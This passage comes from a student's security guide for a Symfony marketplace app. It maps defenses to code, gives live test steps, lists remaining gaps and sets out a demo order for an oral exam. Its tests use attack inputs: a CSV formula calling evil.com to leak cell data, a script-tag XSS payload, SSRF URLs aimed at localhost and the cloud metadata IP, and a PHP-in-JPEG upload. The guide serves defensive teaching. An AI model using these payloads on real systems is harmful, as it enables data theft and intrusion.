| [.env](.env#L19-L21) | `APP_SECRET=` empty, `APP_ENCRYPTION_KEY=` empty | 19-21, 55-57 |

**The defending code**

`src/Service/FieldEncryptor.php` lines 52-63:
```php
public function encrypt(#[\SensitiveParameter] string $plaintext): string
{
    // A new random nonce for every encryption (24 bytes).
    $nonce = random_bytes(\SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    $key = $this->key();
    // Encrypt + add an authentication tag (MAC).
    $cipher = sodium_crypto_secretbox($plaintext, $nonce, $key);
    // SECURITY: sensitive data - erase the key from memory as soon as it is no longer needed.
    sodium_memzero($key);

    // The nonce is not secret: it is stored next to the ciphertext so decrypt() can use it.
    return self::PREFIX.base64_encode($nonce.$cipher);
}
```

`src/Controller/Seller/ShopController.php` lines 133-134:
```php
// SECURITY (rule 11): encrypted before it touches the entity; the clear IBAN is never persisted or logged.
$seller->setEncryptedIban($encryptor->encrypt($iban), substr($iban, -4));
```

`src/Controller/CheckoutController.php` lines 211-221:
```php
// SECURITY (rule 11): simulated tokenisation. Only what is needed later is kept; the full number and
// the CVV are wiped from memory right now and never written anywhere (DB, session, logs).
$request->getSession()->set(self::SESSION_PAYMENT, [
    'token' => bin2hex(random_bytes(16)),
    'method' => PaymentMethod::Card->value,
    'holder' => trim((string) $payment->cardHolder),
    'last4' => $payment->getLast4(),
    'expiry' => (string) $payment->expiry,
    'expires' => time() + self::PAYMENT_TTL,
]);
$payment->eraseSensitiveData();
```

**How it works.** The IBAN is encrypted with XSalsa20-Poly1305 (libsodium secretbox) with a random nonce; the key lives in `.env.local` (dev, git-ignored) or the Symfony secrets vault (prod), never in the database or in Git. A changed ciphertext fails the MAC check. For cards, only the holder name and the last 4 digits are kept; the full number and the CVV never leave the request's memory.

**How to test it live**
1. Log in as `seller1@shop.test`, `/seller/payouts`, save `FR7630006000011234567890189`. Expected: the page shows `•••• •••• •••• 0189`.
2. In phpMyAdmin, `user.iban_encrypted` for seller1 starts with `v1:` followed by base64 noise. Save the same IBAN again: the value is different (new nonce).
3. Place a card order as `buyer1`, then look at the `order` table: only `card_holder` and `card_last4`, no card number, no CVV.
4. Run `git ls-files | findstr .env` → only `.env`, `.env.dev`, `.env.test`, `.env.local.example`; open `.env`: `APP_SECRET=` and `APP_ENCRYPTION_KEY=` are empty.

**Related test:** NONE for the encryption. See [Gaps](#gaps-to-fix).
Note: `.env.test` contains `APP_SECRET='$ecretf0rt3st'`. This is the standard Symfony test value, used only by PHPUnit, not a real secret.

---

## 17. CSV injection (audit log export)

**The attack.** The attacker puts a spreadsheet formula in a field that later lands in a CSV opened in Excel.
Example here: on `/login`, type the email `=HYPERLINK("http://evil.com/?"&A1,"click")`. The failed login is logged; the admin exports the audit log and opens it in Excel.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [src/Service/CsvSanitizer.php](src/Service/CsvSanitizer.php#L22-L44) | `CsvSanitizer::cell` | 22-44 |
| [src/Service/CsvSanitizer.php](src/Service/CsvSanitizer.php#L53-L56) | `CsvSanitizer::row` | 53-56 |
| [src/Controller/Admin/AuditController.php](src/Controller/Admin/AuditController.php#L89-L100) | `AuditController::export`: every cell sanitized | 89-100 |
| [src/Controller/Admin/AuditController.php](src/Controller/Admin/AuditController.php#L107-L110) | `no-store` + `nosniff` | 107-110 |

**The defending code**

`src/Service/CsvSanitizer.php` lines 22-44:
```php
// A cell that starts with one of these characters is read as a formula by Excel / LibreOffice.
private const DANGEROUS_FIRST_CHARS = ['=', '+', '-', '@', "\t", "\r"];
...
public static function cell(string $value): string
{
    // Control characters (except tab/newline handled by the CSV quoting) are removed.
    $value = (string) preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $value);

    if ('' !== $value && in_array($value[0], self::DANGEROUS_FIRST_CHARS, true)) {
        return "'".$value;
    }

    return $value;
}
```

`src/Controller/Admin/AuditController.php` lines 89-92:
```php
// SECURITY (CSV injection): every cell goes through CsvSanitizer. A value such as
// "=HYPERLINK(...)" or "@SUM(...)" (e.g. typed as an email at login or sent as User-Agent) is
// prefixed with a quote, so Excel/LibreOffice show it as text instead of executing it.
fputcsv($out, CsvSanitizer::row([
```

**How it works.** A cell starting with `=`, `+`, `-`, `@`, TAB or CR gets a leading `'`, so the spreadsheet shows it as text instead of running it as a formula. Every column is sanitized, including the User-Agent and the JSON details.

**How to test it live**
1. Log out. On `/login` type email `=HYPERLINK("http://evil.com","x")` (the browser may refuse the format: send it with Burp) and any password.
2. In Burp, also set the header `User-Agent: =1+1`.
3. Log in as `admin@shop.test`, `/admin/audit` → "Export CSV". Open the file in Excel/LibreOffice.
   Expected: the cells show `'=HYPERLINK(…)` and `'=1+1` as plain text. No link, no `2`.

**Related test:** [tests/Unit/CsvSanitizerTest.php](tests/Unit/CsvSanitizerTest.php#L29) `testCell` (data provider with dangerous prefixes). Also [tests/Security/CurrencyTest.php](tests/Security/CurrencyTest.php#L109) `testAuditCsvExportStatesTheCurrency` checks the export works.

---

## 18. Vulnerable dependencies (CI workflow)

**The attack.** The app uses a library with a known CVE; the attacker uses the public exploit.
Example here: an old version of a Symfony component or a JS package served by AssetMapper.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [.github/workflows/security.yml](.github/workflows/security.yml#L1-L10) | runs on every push and pull request | 1-10 |
| [.github/workflows/security.yml](.github/workflows/security.yml#L42-L46) | `composer audit` + `importmap:audit` | 42-46 |
| [.github/workflows/security.yml](.github/workflows/security.yml#L51-L61) | PHPStan level 6 + Twig/YAML/container lint | 51-61 |
| [.github/workflows/security.yml](.github/workflows/security.yml#L12-L13) | least-privilege token (`contents: read`) | 12-13 |

**The defending code**

`.github/workflows/security.yml` lines 42-52:
```yaml
- name: Composer audit (known vulnerabilities)
  run: composer audit --no-interaction

- name: Importmap audit (JS vulnerabilities)
  run: php bin/console importmap:audit

- name: Warm up container (needed by PHPStan's Symfony extension)
  run: php bin/console cache:warmup

- name: PHPStan (level 6)
  run: vendor/bin/phpstan analyse --no-progress --memory-limit=1G
```

**How it works.** On every push, GitHub Actions checks all PHP packages (`composer.lock`) and JS packages (importmap) against the public vulnerability databases. If one has a known CVE, the job fails and the commit shows a red cross. PHPStan catches type errors that often hide bugs.

**How to test it live**
1. Open the GitHub repo → "Actions" tab → "Security checks": show a green run and its steps.
2. Locally: `composer audit` and `php bin/console importmap:audit`. Expected: "No security vulnerability advisories found".

**Related test:** the CI job itself. No PHPUnit step in CI (see [Gaps](#gaps-to-fix)).

---

## 19. Audit log and security center (detection)

**The attack.** An attack happens and nobody notices (no logs = no detection, no proof).
Example here: an attacker tries 500 passwords on `admin@shop.test`, probes other users' order UUIDs, or tries SSRF.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [src/Service/AuditLogger.php](src/Service/AuditLogger.php#L54-L90) | `AuditLogger::log`: DB table + Monolog | 54-90 |
| [src/Entity/AuditLog.php](src/Entity/AuditLog.php#L91) | `SECURITY_EVENTS` list | 91 |
| [src/Entity/AuditLog.php](src/Entity/AuditLog.php#L103) | logs survive account deletion (SET NULL) | 103 |
| [src/EventSubscriber/LoginLockoutSubscriber.php](src/EventSubscriber/LoginLockoutSubscriber.php#L73-L124) | login success / failure / blocked / locked | 73-124 |
| [src/EventSubscriber/AccessDeniedSubscriber.php](src/EventSubscriber/AccessDeniedSubscriber.php#L51-L70) | every 403 of a logged-in user (IDOR probing) | 51-70 |
| [src/EventSubscriber/TwoFactorSubscriber.php](src/EventSubscriber/TwoFactorSubscriber.php#L67-L77) | 2FA success / failure | 67-77 |
| [src/Controller/Admin/AuditController.php](src/Controller/Admin/AuditController.php#L29-L35) | read-only, admin only (no edit/delete) | 29-35 |
| [src/Controller/Admin/AuditController.php](src/Controller/Admin/AuditController.php#L137-L157) | `AuditController::security`: security center | 137-157 |
| [src/Controller/SecuritySettingsController.php](src/Controller/SecuritySettingsController.php#L86-L87) | user sees their own login history | 86-87 |

**The defending code**

`src/Service/AuditLogger.php` lines 54-69:
```php
public function log(string $action, array $details = [], ?User $user = null): void
{
    // Who and from where: the given user (or the logged-in one), the client IP and browser.
    $user ??= $this->currentUser();
    $request = $this->requestStack->getMainRequest();
    // SECURITY: the User-Agent is attacker-controlled: truncated by the entity, stored with a bound parameter
    // (no SQLi) and auto-escaped when displayed (no XSS in the admin log viewer).
    $entry = new AuditLog($action, $details, $user, $request?->getClientIp(), $request?->headers->get('User-Agent'));

    // 1. Write to the log file (Monolog), as warning or info.
    $context = ['action' => $action, 'user' => $user?->getEmail(), 'ip' => $entry->getIp()] + $details;
    if (in_array($action, self::WARNING_ACTIONS, true)) {
        $this->securityLogger->warning($action, $context);
    } else {
        $this->securityLogger->info($action, $context);
    }
```

`src/EventSubscriber/AccessDeniedSubscriber.php` lines 65-69:
```php
// SECURITY: logging - who was refused, on which URL and with which HTTP method.
$this->audit->log(AuditLog::ACCESS_DENIED, [
    'path' => mb_substr($event->getRequest()->getPathInfo(), 0, 255),
    'method' => $event->getRequest()->getMethod(),
], $user);
```

`src/Controller/Admin/AuditController.php` lines 143-155:
```php
return $this->render('admin/security.html.twig', [
    'period' => $period,
    'failedSeries' => $stats->failedLoginSeries($period),
    'topIps' => $stats->topFailingIps(8),
    'lockedUsers' => $users->findLocked(),
    'blockedUploads' => $logs->findRecentByActions([AuditLog::UPLOAD_REJECTED], 8),
    'blockedSsrf' => $logs->findRecentByActions([AuditLog::SSRF_BLOCKED], 8),
    'denied' => $logs->findRecentByActions([AuditLog::ACCESS_DENIED, AuditLog::RATE_LIMITED, AuditLog::PASSWORD_RESET_INVALID], 8),
    'without2fa' => $stats->usersWithout2fa(8),
    'without2faCount' => $stats->countWithout2fa(),
    'failed24h' => $logs->countSince(AuditLog::LOGIN_FAILURE, new \DateTimeImmutable('-24 hours')),
    'ssrf7d' => $logs->countSince(AuditLog::SSRF_BLOCKED, new \DateTimeImmutable('-7 days')),
    'uploads7d' => $logs->countSince(AuditLog::UPLOAD_REJECTED, new \DateTimeImmutable('-7 days')),
]);
```

**How it works.** Every security event (logins, lockouts, 2FA, role changes, orders, refused uploads, SSRF, 403s, rate limits, admin actions, CSV export) is written to the `audit_log` table with user, IP, User-Agent and time, and to the Monolog `security` channel. The table is append-only from the app (no edit/delete page). The security center turns it into a dashboard: failed-login chart, top attacking IPs, locked accounts, blocked uploads/SSRF, accounts without 2FA.

**How to test it live**
1. Do any attack of this guide (wrong passwords, IDOR, SSRF).
2. Log in as `admin@shop.test`, open `/admin/security`. Expected: the event appears in the right card, with IP and time.
3. `/admin/audit`: filter by action (`login.failure`, `access.denied`, `ssrf.blocked`…), user, IP or dates.
4. As `buyer1`, `/account/security` → "Login history" shows only buyer1's own logins.

**Related test:** [tests/Security/CurrencyTest.php](tests/Security/CurrencyTest.php#L109) `testAuditCsvExportStatesTheCurrency` (export works). No test checks that events are written. See [Gaps](#gaps-to-fix).

---

## 20. Security headers, HTTPS, session cookies, error pages

**The attack.** Missing headers make other attacks easier: SSL stripping on Wi-Fi, session cookie stolen over HTTP, MIME sniffing, version disclosure, stack traces that leak paths and SQL.
Example here: a user on café Wi-Fi opens `http://` and an attacker downgrades the connection; or a 500 error shows the DB password in a stack trace.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [config/packages/nelmio_security.yaml](config/packages/nelmio_security.yaml#L8-L27) | `nosniff`, `Referrer-Policy`, `Permissions-Policy` | 8-27 |
| [config/packages/nelmio_security.yaml](config/packages/nelmio_security.yaml#L56-L62) | HSTS 1 year + HTTPS redirect | 56-62 |
| [config/packages/framework.yaml](config/packages/framework.yaml#L8-L18) | cookie `secure`, `httponly`, `samesite`, 1 h idle | 8-18 |
| [config/packages/framework.yaml](config/packages/framework.yaml#L23-L29) | prod: `__Host-` cookie, always secure | 23-29 |
| [config/packages/security.yaml](config/packages/security.yaml#L87-L88) | session fixation: `migrate` | 87-88 |
| [config/packages/security.yaml](config/packages/security.yaml#L84-L85) | session destroyed at logout | 84-85 |
| [src/EventSubscriber/ResponseHardeningSubscriber.php](src/EventSubscriber/ResponseHardeningSubscriber.php#L31-L38) | removes `X-Powered-By` | 31-38 |
| [templates/bundles/TwigBundle/Exception/error.html.twig](templates/bundles/TwigBundle/Exception/error.html.twig#L6-L24) | custom error page, no details | 6-24 |
| [src/Controller/CheckoutController.php](src/Controller/CheckoutController.php#L415-L421) | `Cache-Control: no-store` on payment pages | 415-421 |

**The defending code**

`config/packages/nelmio_security.yaml` lines 56-62:
```yaml
# HSTS: browsers remember to use HTTPS only for 1 year (protects against SSL stripping).
# forced_ssl also redirects any http:// request to https://.
forced_ssl:
    enabled: true
    hsts_max_age: 31536000
    hsts_subdomains: true
    hsts_preload: false
```

`config/packages/framework.yaml` lines 13-18 and 23-29:
```yaml
session:
    cookie_secure: auto
    cookie_httponly: true
    cookie_samesite: lax
    # Idle sessions end after 1 hour of inactivity (garbage-collected server side).
    gc_maxlifetime: 3600
...
when@prod:
    framework:
        session:
            cookie_secure: true
            # "__Host-" prefix: the browser only accepts it with Secure, Path=/ and no Domain (no subdomain can
            # overwrite it).
            name: '__Host-SMSESSID'
```

`templates/bundles/TwigBundle/Exception/error.html.twig` lines 6-12:
```twig
{#
    SECURITY (rule 16): production error page. It shows only a generic message and the status code: never the
    exception message, stack trace, file paths, SQL or framework version. Details go to the server log only.
    (Stack traces appear only in the dev environment, APP_ENV=dev + APP_DEBUG=1.)
    It deliberately uses a minimal shell with NO database query (no categories menu, no cart counter), so it still
    renders when the error comes from the database itself.
#}
```

**How it works.** HSTS forces HTTPS for a year, so a downgrade is impossible after the first visit. The session cookie can't be read by JS, isn't sent over HTTP, isn't sent on cross-site POSTs, and gets a new id at login (no session fixation). In prod the error page only shows the status code and a fixed message; details go to the server log.

**How to test it live**
1. `curl -sI https://127.0.0.1:8000/ -k`. Expected headers: `Strict-Transport-Security: max-age=31536000; includeSubDomains`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `Content-Security-Policy: …`, and **no** `X-Powered-By`.
2. `curl -sI http://127.0.0.1:8000/`. Expected: redirect to `https://`.
3. DevTools → Application → Cookies: the session cookie has `HttpOnly`, `Secure`, `SameSite=Lax`.
4. Session fixation: note the session cookie value, log in, look again. Expected: a different value.
5. Error page: open `/products/00000000-0000-4000-8000-000000000000`. Expected: custom "Page not found" page. To show the 500 page without stack trace, run with `APP_ENV=prod APP_DEBUG=0`.

**Related test:** [tests/Security/PrivilegeMatrixTest.php](tests/Security/PrivilegeMatrixTest.php#L73) `testBlockedUserSessionIsEnded` (session handling). No test for headers. See [Gaps](#gaps-to-fix).

---

## 21. Extra defenses found in the code

These are not in the list above but exist in the code.

### 21.1 Cash on delivery anti-abuse

**The attack.** "Denial of inventory": one account places many unpaid cash orders to freeze a shop's stock, or orders expensive goods and refuses them at the door.

| Location | Class::method | Lines |
|---|---|---|
| [src/Service/CashOnDeliveryPolicy.php](src/Service/CashOnDeliveryPolicy.php#L58-L73) | `CashOnDeliveryPolicy::assertAllowed`: 1 seller, max 500 DT, max 2 pending | 58-73 |
| [src/Service/CheckoutService.php](src/Service/CheckoutService.php#L94-L99) | buyer row locked (no race on the "max 2" rule) | 94-99 |
| [src/Service/CheckoutService.php](src/Service/CheckoutService.php#L146-L151) | rules checked inside the transaction on DB total | 146-151 |
| [src/Controller/CheckoutController.php](src/Controller/CheckoutController.php#L297-L310) | method from the server session + 5 cash orders/hour | 297-310 |
| [config/packages/rate_limiter.yaml](config/packages/rate_limiter.yaml#L36-L41) | `cash_order` limiter | 36-41 |
| [src/Security/Voter/OrderVoter.php](src/Security/Voter/OrderVoter.php#L85-L88) | only the seller of EVERY item marks "cash collected" | 85-88 |

```php
// src/Service/CashOnDeliveryPolicy.php lines 62-72
if (count(array_unique($sellerIds)) > 1) {
    throw new CashOnDeliveryException(CashOnDeliveryException::REASON_MULTIPLE_SELLERS, 'Cash on delivery is only available when all the items come from the same shop. Please pay by card or order from one shop at a time.');
}
// SECURITY: bcmath comparison on decimal strings (no float rounding trick around the limit).
if (bccomp($total, self::MAX_ORDER_TOTAL, Money::SCALE) > 0) {
    throw new CashOnDeliveryException(CashOnDeliveryException::REASON_MAX_TOTAL, sprintf('Cash on delivery is limited to orders up to %s. Please pay by card or reduce your cart.', Money::format(self::MAX_ORDER_TOTAL)));
}
// Rule 3: not too many unpaid cash orders at the same time (counted in the database).
if ($this->orders->countPendingCashOrders($buyer) >= self::MAX_PENDING_ORDERS) {
    throw new CashOnDeliveryException(CashOnDeliveryException::REASON_MAX_PENDING, sprintf('You already have %d cash-on-delivery orders waiting to be paid. Please pay by card, or wait until one of them is delivered.', self::MAX_PENDING_ORDERS));
}
```

**Test live:** as `buyer1`, put more than 500 DT in the cart, choose "Cash on delivery". Expected: "Cash on delivery is limited to orders up to 500,000 DT…". As admin, `/admin/audit?action=order.cash_blocked`.
**Related tests:** [tests/Security/CashOnDeliveryTest.php](tests/Security/CashOnDeliveryTest.php): `testCashOrderAboveTheLimitIsRejected` (89), `testThirdPendingCashOrderIsRejected` (125), `testCashOrdersAreRateLimitedPerBuyer` (171), `testForgedPaymentMethodIsRejected` (193), `testSellerCannotMarkCashCollectedOnAnotherSellersOrder` (231), `testRefusedAtDeliveryCancelsTheOrderAndRestoresStock` (285).

### 21.2 Other rate limits (newsletter, registration, password change, reset token)

| Limiter | Config | Used in |
|---|---|---|
| `newsletter` 5/h per IP | [rate_limiter.yaml](config/packages/rate_limiter.yaml#L42-L46) 42-46 | [NewsletterController.php](src/Controller/NewsletterController.php#L65-L71) 65-71 |
| `registration` 5/h per IP | [rate_limiter.yaml](config/packages/rate_limiter.yaml#L31-L35) 31-35 | [RegistrationController.php](src/Controller/RegistrationController.php#L61-L67) 61-67 |
| `password_change` 5/15 min per account | [rate_limiter.yaml](config/packages/rate_limiter.yaml#L26-L30) 26-30 | [ProfileController.php](src/Controller/ProfileController.php#L104-L110) 104-110 |
| `password_reset_token` 10/15 min per IP | [rate_limiter.yaml](config/packages/rate_limiter.yaml#L10-L14) 10-14 | [ResetPasswordController.php](src/Controller/ResetPasswordController.php#L146-L151) 146-151 |
| `two_factor_settings` 5/5 min per account | [rate_limiter.yaml](config/packages/rate_limiter.yaml#L21-L25) 21-25 | [SecuritySettingsController.php](src/Controller/SecuritySettingsController.php#L254-L264) 254-264 |

### 21.3 Session security after sensitive changes

- **Password change logs out every session** ([src/Controller/ProfileController.php](src/Controller/ProfileController.php#L118-L124) 118-124, with [src/Entity/User.php](src/Entity/User.php#L486-L488) 486-488): the session stores a checksum of the hash, so a new hash ends all old sessions.
- **Admin block ends live sessions** ([src/EventSubscriber/LockedUserSubscriber.php](src/EventSubscriber/LockedUserSubscriber.php#L56-L72) 56-72). The automatic brute-force lock does *not* kick the victim out, on purpose (lines 57-58). Test: [PrivilegeMatrixTest::testBlockedUserSessionIsEnded](tests/Security/PrivilegeMatrixTest.php#L73).
- **Reset token removed from the URL** ([src/Controller/ResetPasswordController.php](src/Controller/ResetPasswordController.php#L132-L138) 132-138) so it doesn't leak in the Referer or history; single use (lines 170-171); stored hashed ([src/Entity/ResetPasswordRequest.php](src/Entity/ResetPasswordRequest.php#L18) 18).

### 21.4 Business logic integrity

- **Reviews only by real buyers, once** ([src/Security/Voter/ReviewVoter.php](src/Security/Voter/ReviewVoter.php#L91-L95) 91-95) + DB unique index ([src/Entity/Review.php](src/Entity/Review.php#L25-L26) 25-26). Test: `ObjectAccessTest::testBuyerCannotReviewAProductHeNeverBought` (line 82).
- **Order status state machine**: only the next step is accepted ([src/Entity/OrderItem.php](src/Entity/OrderItem.php#L170) 170, used in [src/Controller/OrderController.php](src/Controller/OrderController.php#L139-L146) 139-146).
- **Exclusive roles**: a DB row with two roles can't log in ([src/Security/UserChecker.php](src/Security/UserChecker.php#L39-L43) 39-43).
- **Can't buy your own product** ([src/Controller/CartController.php](src/Controller/CartController.php#L83-L86) 83-86, again in [src/Service/CheckoutService.php](src/Service/CheckoutService.php#L123-L126) 123-126).

### 21.5 Small hardening

- `X-Powered-By` removed ([src/EventSubscriber/ResponseHardeningSubscriber.php](src/EventSubscriber/ResponseHardeningSubscriber.php#L31-L38) 31-38).
- `http_method_override: false` ([config/packages/framework.yaml](config/packages/framework.yaml#L5-L6) 5-6): no `_method=DELETE` smuggled in a POST.
- Decompression bomb guard on images ([src/Service/ImageStorage.php](src/Service/ImageStorage.php#L110-L113) 110-113).
- `Permissions-Policy` disables camera, microphone, geolocation, payment, USB ([config/packages/nelmio_security.yaml](config/packages/nelmio_security.yaml#L19-L27) 19-27).
- Admin account creation refuses a password on the command line (shell history) and hides input ([src/Command/CreateAdminCommand.php](src/Command/CreateAdminCommand.php#L86-L95) 86-95).

---

## Gaps to fix

Everything below was checked in the code. None of these is a critical hole, but a professor may ask about them.

| # | Gap | Where | What to do |
|---|-----|-------|------------|
| 1 | **User enumeration on registration**: "This email address is already registered." | [src/Entity/User.php](src/Entity/User.php#L37) line 37 | Show a neutral message ("If this email is free, your account was created; check your inbox") or accept the risk and explain the rate limit (5/h per IP). |
| 2 | **User enumeration via lockout/blocked messages**: only real accounts can show "Too many failed login attempts…" or "This account has been blocked…" | [src/Security/UserChecker.php](src/Security/UserChecker.php#L23-L24) lines 23-24, 46-54 | Use the generic "Invalid credentials." for locked accounts too (and log the real reason). |
| 3 | **Timing difference on password reset**: the mail is only sent for existing accounts | [src/Controller/ResetPasswordController.php](src/Controller/ResetPasswordController.php#L91-L93) lines 91-93 | Send the mail asynchronously (Messenger) so both paths answer in the same time. |
| 4 | **TOTP secret stored in clear** in the `user.totp_secret` column (the IBAN is encrypted, the 2FA secret is not) | [src/Entity/User.php](src/Entity/User.php#L119-L122) lines 119-122 | Encrypt it with `FieldEncryptor` like the IBAN. |
| 5 | **Monolog security logs in prod**: the `main` handler is `fingers_crossed` with `action_level: error`, so `security` warnings are only written to the log file when an error happens in the same request. The `audit_log` table is still always written. | [config/packages/monolog.yaml](config/packages/monolog.yaml#L32-L46) lines 32-46 | Add a dedicated stream handler for `channels: [security]`, level `info`. |
| 6 | **Missing automated tests** for: SQL injection, XSS, login throttling / lockout, 2FA rate limit, password hash format, user enumeration, file upload, SSRF (`SafeImageFetcher::validateUrl` / `isPublicIp` are easy unit tests), open redirect (`SafeRedirect::isSafePath` is an easy unit test), security headers, IBAN encryption round trip, audit events, stock race condition. | [tests/](tests/) | Add unit tests for `SafeRedirect`, `SafeImageFetcher::isPublicIp`, `FieldEncryptor`, `ImageStorage`, and functional tests for lockout and headers. |
| 7 | **PHPUnit is not run in CI**: the workflow runs audits, PHPStan and lints only. | [.github/workflows/security.yml](.github/workflows/security.yml#L36-L61) | Add a MariaDB service and a `php bin/phpunit` step. |
| 8 | **Registration binds the User entity** (explicit fields, safe) instead of a DTO, unlike the profile/IBAN/payment forms. Not a hole, but rule 6 says "DTOs". | [src/Form/RegistrationFormType.php](src/Form/RegistrationFormType.php#L83-L84) lines 83-84 | Optional: a `RegistrationDto` for consistency. |

---

## Demo order for the oral

Prepare before the oral: `php bin/console doctrine:fixtures:load`, `symfony serve -d`, Burp Suite with its CA installed, two browsers (or one normal + one private window), and an admin tab on `/admin/security`.

| Step | Attack | Account | What to show | Expected result |
|---|---|---|---|---|
| 1 | **IDOR** (section 4) | `buyer1` then `buyer2` | Copy buyer1's `/orders/<uuid>`, open it as buyer2 | **403**, then the `access.denied` row in `/admin/audit` |
| 2 | **Price tampering** (section 11) | `buyer1` | Burp: add `price=0.01` on "Add to cart", add `checkout_form[total]=0.01` on payment | Real DB price kept; **422 "extra fields"** |
| 3 | **Stored XSS + CSP** (section 2) | `buyer1` | Review with `<script>alert(1)</script>` on a bought product; show the CSP header in DevTools | Shown as text; CSP blocks inline scripts |
| 4 | **Brute force + lockout** (section 7) | `buyer3` (attacked), then `admin` | 5 wrong passwords, then the right one | Refused; buyer3 in "Locked accounts" on `/admin/security`; unlock it |
| 5 | **Malicious upload** (section 12) | `seller1` | Upload `shell.jpg` containing PHP | "File type "text/x-php" is not allowed"; shown in "Blocked uploads" |
| 6 | **SSRF** (section 13) | `seller1` | Import `https://127.0.0.1/a.jpg`, `http://…`, `https://169.254.169.254/` | "This URL is not allowed."; internal reasons in "Blocked SSRF" |
| 7 | **Privilege escalation + detection** (sections 5 and 19) | `admin` | Burp: change `role=seller` to `role=admin` on buyer4; then tour `/admin/security` and export the CSV (section 17) | **403**, buyer4 still a buyer; every previous attack visible in the security center |

Tip: run `php bin/phpunit tests/Security tests/Unit` at the end to show the automated proofs (green).
